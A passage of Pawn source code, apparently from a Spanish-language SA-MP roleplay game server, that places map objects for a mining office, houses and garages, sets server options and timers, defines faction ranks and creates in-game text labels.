	CreateObject(899, -58.52188, -1763.90503, 743.00000,   0.00000, 0.00000, -24.00001);
	CreateObject(899, -60.40875, -1753.44861, 748.95105,   0.00000, 0.00000, 34.25999);
	CreateObject(899, -58.63491, -1753.08691, 743.00000,   0.00000, 0.00000, -20.46001);
	CreateObject(899, -62.35653, -1787.20605, 748.95105,   0.00000, 0.00000, -2.46001);
	CreateObject(899, -59.38841, -1768.23413, 748.95105,   0.00000, 0.00000, 31.50000);
	CreateObject(899, -25.72558, -1776.33472, 746.74921,   0.00000, 0.00000, -406.19931);
	CreateObject(899, -26.35951, -1761.21765, 746.74921,   0.00000, 0.00000, -406.19931);
	CreateObject(899, -27.23732, -1744.74902, 746.74921,   0.00000, 0.00000, -406.19931);
	CreateObject(897, -51.86588, -1742.73499, 743.00275,   0.00000, 0.00000, 0.00000);
	CreateObject(897, -39.11488, -1737.05115, 743.00275,   0.00000, 0.00000, 0.00000);
	CreateObject(897, -41.92130, -1731.74304, 743.00275,   0.00000, 0.00000, 34.32003);
	CreateObject(897, -54.38836, -1737.69604, 743.00275,   0.00000, 0.00000, -3.29997);
	CreateObject(897, -57.32939, -1734.36853, 743.00275,   0.00000, 0.00000, 36.48006);
	CreateObject(897, -44.48940, -1727.32825, 743.00275,   0.00000, 0.00000, 50.34007);
	CreateObject(897, -63.83605, -1732.17432, 743.00275,   0.00000, 0.00000, 36.48006);
	CreateObject(897, -52.10003, -1722.75940, 743.00275,   0.00000, 0.00000, 46.86007);
	CreateObject(897, -58.65533, -1720.04602, 743.00275,   0.00000, 0.00000, 24.12006);
	CreateObject(897, -62.47881, -1720.39905, 743.00275,   0.00000, 0.00000, 6.42006);
	CreateObject(897, -67.87538, -1719.18164, 743.00275,   0.00000, 0.00000, -31.43996);
	CreateObject(897, -71.42590, -1730.35791, 743.00275,   0.00000, 0.00000, 54.60008);
	CreateObject(897, -79.75711, -1723.13318, 743.00275,   0.00000, 0.00000, -21.11992);
	CreateObject(897, -68.75751, -1716.67517, 743.00275,   0.00000, 0.00000, -74.33995);
	CreateObject(897, -80.55328, -1717.06091, 743.00275,   0.00000, 0.00000, -25.91993);
	CreateObject(897, -79.32236, -1708.39136, 743.00275,   0.00000, 0.00000, -59.21993);
	CreateObject(897, -38.24154, -1734.08179, 748.81995,   0.00000, 0.00000, 0.00000);
	CreateObject(897, -41.34068, -1728.47644, 748.81995,   0.00000, 0.00000, 0.00000);
	CreateObject(897, -45.59306, -1723.25769, 748.81995,   0.00000, 0.00000, 0.00000);
	CreateObject(897, -51.50254, -1720.61011, 748.81995,   0.00000, 0.00000, 0.00000);
	CreateObject(897, -55.59548, -1719.93103, 748.81995,   0.00000, 0.00000, 0.00000);
	CreateObject(897, -66.50033, -1717.47717, 748.81995,   0.00000, 0.00000, 0.00000);
	CreateObject(897, -56.40707, -1739.47034, 748.81995,   0.00000, 0.00000, 0.00000);
	CreateObject(897, -61.70749, -1736.49658, 748.81995,   0.00000, 0.00000, 0.00000);
	CreateObject(897, -68.24284, -1732.98389, 748.81995,   0.00000, 0.00000, 0.00000);
	CreateObject(897, -72.99895, -1731.76379, 748.81995,   0.00000, 0.00000, 0.00000);
	CreateObject(897, -79.04302, -1728.45288, 748.81995,   0.00000, 0.00000, -30.78000);
	CreateObject(897, -82.07169, -1722.24158, 748.81995,   0.00000, 0.00000, -30.78000);
	CreateObject(897, -82.10052, -1716.74084, 748.81995,   0.00000, 0.00000, -30.78000);
	CreateObject(897, -82.45276, -1711.39282, 748.81995,   0.00000, 0.00000, -30.78000);
	CreateObject(897, -68.19642, -1713.15637, 743.00275,   0.00000, 0.00000, -93.95988);
	CreateObject(897, -79.56894, -1703.15686, 743.00275,   0.00000, 0.00000, -23.99992);
	CreateObject(897, -66.78532, -1708.94495, 743.00275,   0.00000, 0.00000, -83.93989);
	CreateObject(897, -65.52290, -1703.45361, 743.00275,   0.00000, 0.00000, -69.11988);
	CreateObject(897, -65.68745, -1698.20898, 743.00275,   0.00000, 0.00000, -56.87990);
	CreateObject(897, -79.55096, -1697.08691, 743.00275,   0.00000, 0.00000, -38.57993);
	CreateObject(897, -78.33022, -1690.65479, 743.00275,   0.00000, 0.00000, -45.95992);
	CreateObject(897, -66.00869, -1693.06335, 743.00275,   0.00000, 0.00000, -65.09991);
	CreateObject(897, -76.47431, -1684.64307, 743.00275,   0.00000, 0.00000, -62.45995);
	CreateObject(897, -64.19297, -1690.02856, 743.00275,   0.00000, 0.00000, -81.95989);
	CreateObject(897, -60.41877, -1680.34949, 743.67340,   0.00000, 0.00000, -109.61999);
	CreateObject(897, -62.08486, -1684.39014, 745.08606,   0.00000, 0.00000, -97.79993);
	CreateObject(897, -62.97079, -1697.72070, 747.09088,   0.00000, 0.00000, -65.09991);
	CreateObject(897, -63.06852, -1703.70093, 747.09088,   0.00000, 0.00000, -65.09991);
	CreateObject(897, -64.24112, -1707.68909, 747.09088,   0.00000, 0.00000, -65.09991);
	CreateObject(897, -82.98895, -1704.91187, 748.81995,   0.00000, 0.00000, -2.64000);
	CreateObject(897, -81.85017, -1696.67944, 748.81995,   0.00000, 0.00000, -2.64000);
	CreateObject(897, -79.40360, -1685.30627, 748.81995,   0.00000, 0.00000, -2.64000);
	CreateObject(897, -77.46304, -1684.25989, 748.81995,   0.00000, 0.00000, -2.64000);
	CreateObject(3461, -57.70653, -1725.54346, 744.47266,   0.00000, 0.00000, 0.00000);
	CreateObject(3461, -50.32522, -1728.86279, 744.47266,   0.00000, 0.00000, 0.00000);
	CreateObject(3461, -77.47004, -1722.12695, 744.47266,   0.00000, 0.00000, 0.00000);
	CreateObject(3461, -72.33083, -1721.15564, 744.47266,   0.00000, 0.00000, 0.00000);
	CreateObject(3461, -73.16969, -1707.69629, 744.47266,   0.00000, 0.00000, 0.00000);
	CreateObject(899, -76.27644, -1667.51440, 746.74921,   0.00000, 0.00000, -490.67929);
	CreateObject(899, -65.36752, -1659.29285, 746.74921,   0.00000, 0.00000, -484.55954);
	CreateObject(897, -58.65609, -1678.71692, 743.67340,   0.00000, 0.00000, -56.99994);
	CreateObject(899, -64.65546, -1653.37732, 746.74921,   0.00000, 0.00000, -434.21921);
	CreateObject(899, -45.36520, -1688.56421, 746.74921,   0.00000, 0.00000, -410.03976);
	CreateObject(897, -40.87182, -1669.84070, 743.67340,   0.00000, 0.00000, -56.99994);
	CreateObject(897, -43.80854, -1667.28333, 749.82751,   0.00000, 0.00000, -125.81998);
	CreateObject(899, -32.32108, -1690.23657, 746.74921,   0.00000, 0.00000, -375.83981);
	CreateObject(897, -36.05290, -1669.54736, 743.67340,   0.00000, 0.00000, -106.49996);
	CreateObject(897, -31.98711, -1668.80054, 743.67340,   0.00000, 0.00000, -128.21997);
	CreateObject(899, -37.74156, -1657.34741, 745.96918,   0.00000, 0.00000, -406.55960);
	CreateObject(899, -39.09856, -1648.14844, 745.96918,   0.00000, 0.00000, -418.67914);
	CreateObject(899, -25.81440, -1662.77979, 745.86920,   0.00000, 0.00000, -443.87921);
	CreateObject(899, -64.69222, -1644.59509, 746.74921,   0.00000, 0.00000, -434.21921);
	CreateObject(899, -38.17680, -1637.79382, 745.96918,   0.00000, 0.00000, -371.87933);
	CreateObject(899, -42.29628, -1630.08911, 745.96918,   0.00000, 0.00000, -357.83975);
	CreateObject(899, -14.65103, -1698.69629, 746.74921,   0.00000, 0.00000, -365.51999);
	CreateObject(899, -12.17145, -1672.57434, 752.66718,   0.00000, 0.00000, -443.87921);
	CreateObject(897, -54.88369, -1677.77234, 751.10022,   0.00000, 0.00000, -56.99994);
	CreateObject(897, -62.25743, -1693.02124, 748.70087,   0.00000, 0.00000, -81.95989);
	CreateObject(897, -62.02174, -1684.38611, 748.08008,   0.00000, 0.00000, -97.79993);
	CreateObject(899, -11.30600, -1669.53870, 745.36688,   0.00000, 0.00000, -443.87921);
	CreateObject(899, 3.60791, -1673.34033, 745.36688,   0.00000, 0.00000, -443.87921);
	CreateObject(899, -12.61699, -1697.30591, 753.39569,   0.00000, 0.00000, -365.51999);
	CreateObject(899, -51.18200, -1620.21277, 745.96918,   0.00000, 0.00000, -355.73984);
	CreateObject(899, -72.99030, -1635.46338, 746.64917,   0.00000, 0.00000, -449.21869);
	CreateObject(899, -75.09654, -1617.23694, 746.64917,   0.00000, 0.00000, -459.65884);
	CreateObject(899, -75.08104, -1617.22437, 751.39020,   0.00000, 0.00000, -459.65884);
	//              	INT OFICINA MINERIA                        //
	CreateObject(18009, -770.85938, 1304.85986, 1000.45117,   0.00000, 0.00000, 0.00000);
	CreateObject(19452, -773.21307, 1301.89661, 999.01300,   0.00000, 0.00000, -90.06000);
	CreateObject(19452, -766.49103, 1297.20288, 998.99298,   0.00000, 0.00000, -179.75990);
	CreateObject(1557, -766.54114, 1299.22021, 997.45831,   0.00000, 0.00000, -270.60001);
	CreateObject(19452, -772.21838, 1291.57874, 997.60596,   0.00000, -91.00000, -180.00000);
	CreateObject(19452, -775.47717, 1291.57312, 997.64600,   0.00000, -91.00000, -180.00000);
	CreateObject(19452, -776.65723, 1291.57312, 997.66602,   0.00000, -91.00000, -180.00000);
	CreateObject(19452, -774.76691, 1307.30176, 998.93298,   0.00000, 0.00000, -90.06000);
	CreateObject(19452, -784.40692, 1307.30176, 998.93298,   0.00000, 0.00000, -90.06000);
	CreateObject(19452, -765.16382, 1307.28931, 998.93298,   0.00000, 0.00000, -90.06000);
	CreateObject(3851, -776.96600, 1295.20459, 999.11438,   0.00000, 0.00000, -89.88000);
	CreateObject(2008, -768.22815, 1303.90234, 997.20245,   0.00000, 0.00000, 93.29996);
	CreateObject(1663, -766.80145, 1304.88000, 997.65509,   0.00000, 0.00000, -88.32002);
	CreateObject(2196, -768.23999, 1304.54150, 998.01337,   0.00000, 0.00000, 34.62003);
	CreateObject(2007, -767.53204, 1302.52161, 997.20398,   0.00000, 0.00000, -179.09995);
	CreateObject(2007, -768.49139, 1302.51160, 997.20398,   0.00000, 0.00000, -179.09990);
	CreateObject(2007, -769.45142, 1302.51160, 997.20398,   0.00000, 0.00000, -179.09990);
	CreateObject(2164, -764.89618, 1303.64551, 997.24365,   0.00000, 0.00000, -87.47993);
	CreateObject(2164, -764.94855, 1305.38623, 997.24365,   0.00000, 0.00000, -87.47993);
	CreateObject(2262, -781.36926, 1296.71887, 999.69568,   0.00000, 0.00000, 89.63990);
	CreateObject(2262, -772.77649, 1306.72205, 999.76453,   0.00000, 0.00000, 0.00000);
	CreateObject(2261, -774.39398, 1306.72156, 999.67291,   0.00000, 0.00000, 0.00000);
	CreateObject(2108, -765.56995, 1306.64221, 997.20239,   0.00000, 0.00000, 0.00000);
	CreateObject(19452, -784.64063, 1302.02197, 997.97302,   0.00000, 0.00000, -90.06000);
	CreateObject(1491, -779.85400, 1302.02588, 997.24707,   0.00000, 0.00000, 0.00000);
	CreateObject(19452, -783.01923, 1302.01184, 1001.47302,   0.00000, 0.00000, -90.06000);
	CreateObject(1757, -772.14575, 1295.73218, 997.70526,   0.00000, 0.00000, -180.72000);
	CreateObject(19452, -770.76288, 1291.47546, 996.89301,   0.00000, 0.00000, -179.75990);
	CreateObject(19452, -777.92291, 1291.47546, 996.89301,   0.00000, 0.00000, -179.75990);
	CreateObject(1757, -775.34332, 1295.65955, 997.70526,   0.00000, 0.00000, -180.72000);
	CreateObject(1823, -776.93140, 1297.00916, 997.60449,   0.00000, 0.00000, 0.00000);
	CreateObject(1823, -773.89734, 1296.95117, 997.60449,   0.00000, 0.00000, 0.00000);
	CreateObject(2161, -770.96460, 1307.20508, 997.18689,   0.00000, 0.00000, 0.00000);
	CreateObject(2161, -770.96460, 1307.20508, 998.50690,   0.00000, 0.00000, 0.00000);
	CreateObject(2161, -769.66461, 1307.20508, 997.18689,   0.00000, 0.00000, 0.00000);
	CreateObject(2161, -769.66461, 1307.20508, 998.50690,   0.00000, 0.00000, 0.00000);
	CreateObject(2737, -782.32172, 1305.00574, 999.36768,   0.00000, 0.00000, 90.42000);
	CreateObject(2284, -776.01343, 1306.73328, 999.67657,   0.00000, 0.00000, 0.00000);
	CreateObject(2283, -777.86029, 1307.19556, 999.85193,   0.00000, 0.00000, 0.00000);
	CreateObject(19452, -776.84369, 1295.09778, 998.85303,   0.00000, 0.00000, -90.00000);
	CreateObject(19452, -767.21332, 1295.08667, 998.85303,   0.00000, 0.00000, -90.00000);
	CreateObject(19452, -766.64093, 1293.64404, 998.99298,   0.00000, 0.00000, -179.75990);
	CreateObject(3851, -765.68597, 1295.20459, 999.11438,   0.00000, 0.00000, -89.88000);
	CreateObject(3851, -776.96600, 1295.20459, 999.11438,   0.00000, 0.00000, -89.88000);
	CreateObject(3851, -766.75928, 1292.85522, 999.11438,   0.00000, 0.00000, -179.99992);
	CreateObject(19452, -763.74371, 1301.88464, 999.01300,   0.00000, 0.00000, -90.06000);
	CreateObject(2161, -782.35229, 1304.60498, 997.18689,   0.00000, 0.00000, 90.36000);
	//              	EXIT MINERIA                        //
	CreateObject(1508, 699.50000, 894.90002, -38.00000,   0.00000, 0.00000, 0.00000);
	CreateObject(2395, 697.59998, 898.00000, -41.82000,   0.00000, 0.00000, 0.00000);
	CreateObject(2395, 693.90002, 898.00000, -41.80000,   0.00000, 0.00000, 0.00000);
	CreateObject(2395, 696.65997, 898.19000, -41.80000,   0.00000, 0.00000, 180.00000);
	CreateObject(2395, 693.90002, 898.00000, -39.10000,   0.00000, 0.00000, 0.00000);
	CreateObject(2395, 697.59998, 898.00000, -39.10000,   0.00000, 0.00000, 0.00000);
	CreateObject(2395, 696.65997, 898.19000, -39.10000,   0.00000, 0.00000, 179.99500);
	CreateObject(2395, 704.00000, 898.19000, -39.10000,   0.00000, 0.00000, 180.00000);
	CreateObject(2395, 700.28998, 898.19000, -39.10000,   0.00000, 0.00000, 179.99500);
	CreateObject(2395, 700.39899, 898.19000, -41.80000,   0.00000, 0.00000, 179.99500);
	CreateObject(2395, 699.90002, 895.40002, -36.22000,   270.00000, 0.00000, 0.00000);
	CreateObject(2395, 699.90002, 892.65997, -36.22000,   269.99500, 0.00000, 0.00000);
	CreateObject(2395, 699.90002, 891.75000, -36.22000,   269.99500, 0.00000, 0.00000);
	CreateObject(2395, 696.29999, 895.40002, -36.22000,   269.99500, 0.00000, 0.00000);
	CreateObject(2395, 693.90002, 895.40002, -36.22000,   269.99500, 0.00000, 0.00000);
	CreateObject(2395, 696.20001, 892.65997, -36.22000,   269.99500, 0.00000, 0.00000);
	CreateObject(2395, 696.20001, 891.70001, -36.22000,   269.99500, 0.00000, 0.00000);
	CreateObject(2395, 693.88000, 892.65997, -36.22000,   269.99500, 0.00000, 0.00000);
	CreateObject(2395, 693.88000, 891.77698, -36.22000,   269.99500, 0.00000, 0.00000);
	CreateObject(2395, 699.90002, 891.70001, -41.66666,   0.00000, 0.00000, 0.00000);
	CreateObject(2395, 699.90002, 891.70001, -39.00000,   0.00000, 0.00000, 0.00000);
	CreateObject(2395, 696.16803, 891.70001, -41.66000,   0.00000, 0.00000, 0.00000);
	CreateObject(2395, 696.19000, 891.70001, -39.00000,   0.00000, 0.00000, 0.00000);
	CreateObject(2395, 693.90002, 891.70001, -41.66000,   0.00000, 0.00000, 0.00000);
	CreateObject(2395, 693.90002, 891.70001, -39.00000,   0.00000, 0.00000, 0.00000);
	CreateObject(2395, 696.65198, 891.85999, -41.65000,   0.00000, 0.00000, 179.99500);
	CreateObject(2395, 699.40002, 891.85999, -41.65000,   0.00000, 0.00000, 179.99500);
	CreateObject(2395, 696.65002, 891.85999, -39.05000,   0.00000, 0.00000, 179.99500);
	CreateObject(2395, 700.38000, 891.85602, -39.04000,   0.00000, 0.00000, 179.99500);
	CreateObject(2395, 694.00000, 898.20001, -36.40000,   90.00000, 180.00000, 180.00000);
	CreateObject(2395, 697.63000, 898.13000, -36.40000,   90.00000, 0.00000, 0.00000);
	CreateObject(2395, 693.90002, 895.59998, -36.40000,   90.00000, 0.00000, 0.00000);
	CreateObject(2395, 697.70001, 895.29999, -36.36000,   90.00000, 0.00000, 0.00000);
	CreateObject(2395, 696.29999, 894.50000, -36.40000,   90.00000, 0.00000, 0.00000);
	CreateObject(2395, 693.90002, 894.50000, -36.40000,   90.00000, 0.00000, 0.00000);
	CreateObject(2395, 696.09998, 895.79999, -36.40000,   90.00000, 0.00000, 0.00000);
	CreateObject(337, 694.36560, 891.90649, -37.47910,   0.00000, 0.00000, -76.14000);
	CreateObject(337, 694.86560, 891.90649, -37.47910,   0.00000, 0.00000, -76.14000);
	CreateObject(337, 695.44562, 891.90649, -37.47910,   0.00000, 0.00000, -76.14000);
	CreateObject(337, 696.00562, 891.90649, -37.47910,   0.00000, 0.00000, -76.14000);
	CreateObject(337, 696.60559, 891.90649, -37.47910,   0.00000, 0.00000, -76.14000);
	CreateObject(337, 697.18561, 891.90649, -37.47910,   0.00000, 0.00000, -76.14000);
	CreateObject(337, 697.78558, 891.90649, -37.47910,   0.00000, 0.00000, -76.14000);
	CreateObject(337, 698.38562, 891.90649, -37.47910,   0.00000, 0.00000, -76.14000);
	CreateObject(337, 694.18561, 891.88647, -38.91910,   0.00000, 0.00000, -76.14000);
	CreateObject(337, 694.05731, 891.88831, -37.49910,   0.00000, 0.00000, -76.14000);
	CreateObject(337, 694.64563, 891.88647, -38.91910,   0.00000, 0.00000, -76.14000);
	CreateObject(337, 695.18561, 891.88647, -38.91910,   0.00000, 0.00000, -76.14000);
	CreateObject(337, 695.78558, 891.88647, -38.91910,   0.00000, 0.00000, -76.14000);
	CreateObject(337, 696.36560, 891.88647, -38.91910,   0.00000, 0.00000, -76.14000);
	CreateObject(337, 696.94562, 891.88647, -38.91910,   0.00000, 0.00000, -76.14000);
	CreateObject(337, 697.50562, 891.88647, -38.91910,   0.00000, 0.00000, -76.14000);
	CreateObject(337, 698.02557, 891.88647, -38.91910,   0.00000, 0.00000, -76.14000);
	CreateObject(337, 698.60559, 891.88647, -38.91910,   0.00000, 0.00000, -76.14000);
	CreateObject(2370, 694.22388, 896.80743, -40.05110,   0.00000, 0.00000, -2.70000);
	CreateObject(2370, 695.80621, 896.75024, -40.05110,   0.00000, 0.00000, -2.70000);
	CreateObject(19120, 693.90887, 896.52417, -39.11040,   -11.00000, -88.00000, 0.00000);
	CreateObject(19120, 694.18890, 896.50421, -39.11040,   -11.00000, -88.00000, 0.00000);
	CreateObject(19120, 694.52887, 896.50421, -39.11040,   -11.00000, -88.00000, 0.00000);
	CreateObject(19120, 693.90887, 896.52417, -39.11040,   -11.00000, -88.00000, 0.00000);
	CreateObject(19120, 694.89191, 896.48608, -39.11040,   -11.00000, -88.00000, 0.00000);
	CreateObject(19120, 695.35193, 896.46613, -39.11040,   -11.00000, -88.00000, 0.00000);
	CreateObject(19120, 695.74933, 896.44629, -39.11040,   -11.00000, -88.00000, 0.00000);
	CreateObject(19120, 696.14929, 896.44629, -39.11040,   -11.00000, -88.00000, 0.00000);
	CreateObject(19120, 696.58929, 896.42627, -39.11040,   -11.00000, -88.00000, 0.00000);
	CreateObject(19120, 696.58929, 896.90631, -39.11040,   -11.00000, -88.00000, 0.00000);
	CreateObject(19120, 696.16931, 896.94629, -39.11040,   -11.00000, -88.00000, 0.00000);
	CreateObject(19120, 696.58929, 896.42627, -39.11040,   -11.00000, -88.00000, 0.00000);
	CreateObject(19120, 695.77148, 896.93048, -39.11040,   -11.00000, -88.00000, 0.00000);
	CreateObject(19120, 695.37152, 896.93048, -39.11040,   -11.00000, -88.00000, 0.00000);
	CreateObject(19120, 694.89148, 896.93048, -39.11040,   -11.00000, -88.00000, 0.00000);
	CreateObject(19120, 694.55151, 896.93048, -39.11040,   -11.00000, -88.00000, 0.00000);
	CreateObject(19120, 694.17151, 896.93048, -39.11040,   -11.00000, -88.00000, 0.00000);
	CreateObject(19120, 693.89148, 896.93048, -39.11040,   -11.00000, -88.00000, 0.00000);
	CreateObject(19120, 693.89148, 897.49048, -39.11040,   -11.00000, -88.00000, 0.00000);
	CreateObject(19120, 694.17151, 897.49048, -39.11040,   -11.00000, -88.00000, 0.00000);
	CreateObject(19120, 694.57147, 897.49048, -39.11040,   -11.00000, -88.00000, 0.00000);
	CreateObject(19120, 694.95148, 897.49048, -39.11040,   -11.00000, -88.00000, 0.00000);
	CreateObject(19120, 695.47150, 897.49048, -39.11040,   -11.00000, -88.00000, 0.00000);
	CreateObject(19120, 695.85150, 897.49048, -39.11040,   -11.00000, -88.00000, 0.00000);
	CreateObject(19120, 696.27148, 897.49048, -39.11040,   -11.00000, -88.00000, 0.00000);
	CreateObject(19120, 696.61151, 897.49048, -39.11040,   -11.00000, -88.00000, 0.00000);

	#undef CreateObject
	//   Plaza ayunta
 	CreateObject(10368,1479.35000000,-1678.98000000,32.87000000,0.00000000,0.00000000,-180.00000000); //

	//  CASAS
	CreateObject( 14718, 220.48, 1277.57, 1081.13,   0.0, 0.00, 0.0);
	CreateObject( 1498,  222.73, 1272.61, 1081.13,   0.0, 0.00, 0.0);
	CreateObject( 14700, 326.40, 1459.42, 1084.94,   0.0, 0.00, 0.0);
	CreateObject( 1498,  325.57, 1455.30, 1083.42,   0.0, 0.00, 0.0);
	CreateObject( 14712, 272.79, 1244.54, 1084.83,   0.0, 0.00, 0.0);
	CreateObject( 1498,  275.01, 1236.99, 1083.29,   0.0, 0.00, 0.0);
	CreateObject( 14702, 265.00, 1199.27, 1083.55,   0.0, 0.00, 0.0);
	CreateObject( 14725, 269.04, 1195.98, 1082.11,   0.0, 0.00, 0.0);
	CreateObject( 14726, 269.03, 1196.05, 1082.11,   0.0, 0.00, 0.0);
	CreateObject( 14727, 269.09, 1196.01, 1082.11,   0.0, 0.00, 0.0);
	CreateObject( 14716, 269.08, 1196.00, 1082.11,   0.0, 0.00, 0.0);
	CreateObject( 14750, 27.60,  1329.24, 1089.88,   0.0, 0.00, 0.0);
	CreateObject( 1506,  25.04,  1319.87, 1083.36,   0.0, 0.00, 0.0);
	//Casa piso celeste SF
	CreateObject(15042, 2313.37, -1198.41, 1050.02,   0.0, 0.00, 0.00);
	CreateObject(1506, 2307.57, -1199.07, 1047.98,   0.0, 0.00, 0.00);
	CreateObject(1506, 2318.22, -1199.06, 1047.98,   0.0, 0.00, 0.00);
	//Casa Int 13
	CreateObject(14708, 236.63, 1136.16, 1081.76,   0.0, 0.00, 0.0);
	//Casa Int 15
	CreateObject(14706, 268.30, 1075.16, 1086.41,   0.0, 0.00, 0.0);
	//Casa Int 16
	CreateObject(14758, 139.52, 1395.56, 1084.73,   0.00, 0.00, 0.00);
	CreateObject(14757, 154.28, 1399.51, 1084.52,   0.00, 0.00, 0.00);
	CreateObject(1506, 138.75, 1395.49, 1082.85,   0.00, 0.00, 0.00);
	CreateObject(1506, 140.25, 1395.50, 1082.85,   0.00, 0.00, 0.00);
	//Casa Int 17
	CreateObject(14707, 238.41, 995.35, 1087.60,   0.00, 0.00, 0.00);
	CreateObject(1506, 251.53, 994.35, 1083.73,   0.00, 0.00, -90.66);
	CreateObject(1506, 251.54, 995.81, 1083.73,   0.00, 0.00, -90.66);

	// EDIFICIO INT-GROTTI
	CreateObject(9953,-936.59997559,1941.69995117,40.90000153,0.00000000,0.00000000,220.00000000); //object(ottos_autos_sfe) (1)
	CreateObject(9953,-963.00000000,1918.09997559,40.90000153,0.00000000,0.00000000,40.25000000); //object(ottos_autos_sfe) (2)

	// Piso Garage 2P
	CreateObject(14388,1260.09960938,-839.29980469,1093.50000000,0.00000000,0.00000000,0.00000000); //object(madddoggs02) (1)
	CreateObject(14388,1259.69995117,-839.40002441,1089.80004883,0.00000000,0.00000000,0.00000000); //object(madddoggs02) (2)

	// Piso Garage 1P
	CreateObject(18082,424.89999390,-97.30000305,1001.70001221,0.00000000,0.00000000,0.00000000); //object(cj_barber2) (1)
	CreateObject(18082,424.79998779,-94.00000000,1003.20001221,0.00000000,0.00000000,180.00000000); //object(cj_barber2) (2)

	// Piso Garage 1P (2)
	CreateObject(18082,424.89999390,-97.30000305,1001.70001221+10,0.00000000,0.00000000,0.00000000); //object(cj_barber2) (1)
	CreateObject(18082,424.79998779,-94.00000000,1003.20001221+10,0.00000000,0.00000000,180.00000000); //object(cj_barber2) (2)

	// ---====[ Configuración general ]====---- //

    SetGameModeText(MODE_SERVER);
	SendRconCommand("hostname "#NOMBRE_SERVER"");
    SendRconCommand("mapname Los Santos");
    SendRconCommand("weburl "#FORO_SERVER"");
 	//SendRconCommand("password lv3");
    SendRconCommand("rcon_password "#RCON_SERVER"");
	AllowInteriorWeapons(1);
 	DisableInteriorEnterExits();
 	UsePlayerPedAnims();
    ManualVehicleEngineAndLights();
   	ActualizarHora();
   	EnableStuntBonusForAll(false);
    SetNameTagDrawDistance(20.0);
	ShowPlayerMarkers(PLAYER_MARKERS_MODE_GLOBAL);
	#if defined USE_FCNPC
	FCNPC_SetUpdateRate(50);
	#endif

	// ---====[ Timers ]====---- //

	repeat ActualizarHora();
	repeat BajaGasolina();
	repeat ActualizarVelocimetro();
	repeat SubeExperiencia();
	repeat ChequearVida();
	repeat BajaSaldo();
	repeat NecesitaDroga();
	repeat ComprobarCrack();
	repeat GangZones_Dudas();

	#if defined USE_FCNPC
	repeat UpdateFCNPC();
	#endif

	ClimaAleatorio();
	repeat ClimaAleatorio();

	SetTimer("ActivarArmasEnI",3000,false);

	// ---====[ Facciones (Rangos) ]====---- //

	CrearRango(IDLSPD, 	"Cadete");
	CrearRango(IDLSPD, 	"Oficial");
	CrearRango(IDLSPD, 	"Sargento");
	CrearRango(IDLSPD, 	"Detective");
	CrearRango(IDLSPD, 	"Sub-Capitán");
	CrearRango(IDLSPD, 	"Capitán");
	CrearRangoL(IDLSPD, "Comandante");

	//LSEM
	CrearRango(IDLSEM, 	"Cadete");
	CrearRango(IDLSEM, 	"Soldado");
	CrearRango(IDLSEM, 	"Cabo");
	CrearRango(IDLSEM, 	"Sargento");
	CrearRango(IDLSEM, 	"Sargento Mayor");
	CrearRango(IDLSEM, 	"Alférez");
	CrearRango(IDLSEM, 	"Teniente");
	CrearRangoL(IDLSEM, "Capitán");

	//LSMD
	CrearRango(IDLSMD, 	"Médico a prueba");
	CrearRango(IDLSMD, 	"Médico");
	CrearRango(IDLSMD, 	"Sub-director");
	CrearRangoL(IDLSMD, "Director");

	//LSTV
	CrearRango(IDLSTV, 	"Seguridad");
	CrearRango(IDLSTV, 	"Reportero");
	CrearRango(IDLSTV, 	"Redactor");
	CrearRango(IDLSTV,	"Periodista");
	CrearRangoL(IDLSTV, "Director");

	//MECÁNICOS
	CrearRango(IDMECANICOS,	"Ayudante");
	CrearRango(IDMECANICOS,	"Aprendiz");
	CrearRango(IDMECANICOS,	"Profesional");
	CrearRango(IDMECANICOS,	"Supervisor");
	CrearRangoL(IDMECANICOS,"Director");

	//GOBIERNO
	CrearRango(IDGOBIERNO,     "Chofer");
	CrearRango(IDGOBIERNO,     "Guardia");
	CrearRango(IDGOBIERNO,     "Guardia experto");
	CrearRango(IDGOBIERNO,     "Juez");
	CrearRango(IDGOBIERNO,     "Vicepresidente");
	CrearRangoL(IDGOBIERNO,    "Presidente");

	//HITMAN
	CrearRango(IDHITMAN,    "Novato");
	CrearRango(IDHITMAN,    "Asesino");
	CrearRango(IDHITMAN,    "Asesino experto");
	CrearRango(IDHITMAN,    "Destripador");
	CrearRango(IDHITMAN,    "Sub-director");
	CrearRangoL(IDHITMAN,   "Director Hitman");

	// ---====[ 3D Labels ]====---- //
	CreateDynamic3DTextLabel("Ascensor",C_BLANCO,252.4896,109.1263,1003.2188+0.5,4);
	CreateDynamic3DTextLabel("Ascensor",C_BLANCO,1524.4832,-1677.9523,6.2188+0.5,4);
	CreateDynamic3DTextLabel("Ascensor",C_BLANCO,1565.0422,-1685.4037,28.3956+0.5,4);
	CreateDynamic3DTextLabel("Cuarto de armas",C_BLANCO,270.39999390,113.09999847,1005+0.5,6);
	CreateDynamic3DTextLabel("Ropero \n"#CINFO"(/ropero)",C_BLANCO,306.8660,-159.2167,999.5938+0.5,8);//ropero LSPD
	CreateDynamic3DTextLabel("Ropero \n"#CINFO"(/ropero)",C_BLANCO,285.9903,-30.4936,1001.5156+0.5,8);//ropero LSEM
	CreateDynamic3DTextLabel("Armeria policial\n"#CINFO"(/armamento)",C_BLANCO,312.7423,-165.5410,999.6010+0.5,8);//
	CreateDynamic3DTextLabel("Cárceles\n"#CINFO"(/arrestar)",C_BLANCO,2527.2073,-1294.1211,1031.4219+0.5,8);//
	CreateDynamic3DTextLabel("Armeria militar\n"#CINFO"(/armamento)",C_BLANCO,294.00000000,-38.09999847,1001.70001221+0.5,8);// LSPD
	CreateDynamic3DTextLabel("Puedes "#CINFO"/donar "#CBLANCO"al hospital.",C_BLANCO,2593.8953,1324.7419,866.3764,5);// (/donar hospital)
	CreateDynamic3DTextLabel("Quirófano\n\nUtiliza "#CINFO"/curar",C_BLANCO,2572.9324,1262.2339,866.3764,2);
	CreateDynamic3DTextLabel("Caja fuerte\n"#CINFO"(/cajafuerte)",C_BLANCO,253.1785,291.7338,984.0469,2);//lsmd
	CreateDynamic3DTextLabel("Caja fuerte\n"#CINFO"(/cajafuerte)",C_BLANCO,317.6678,-159.0396,999.6010,2);//lspd
	CreateDynamic3DTextLabel("Caja fuerte\n"#CINFO"(/cajafuerte)",C_BLANCO,287.7106,-31.4515,1001.5156,2);//lsem
	CreateDynamic3DTextLabel("Caja fuerte\n"#CINFO"(/cajafuerte)",C_BLANCO,1274.8182,-836.0779,1044.9656,2);//lstv
	CreateDynamic3DTextLabel("Caja fuerte\n"#CINFO"(/cajafuerte)",C_BLANCO,1774.6583,-2026.5764,13.4843,2);//mecanicos
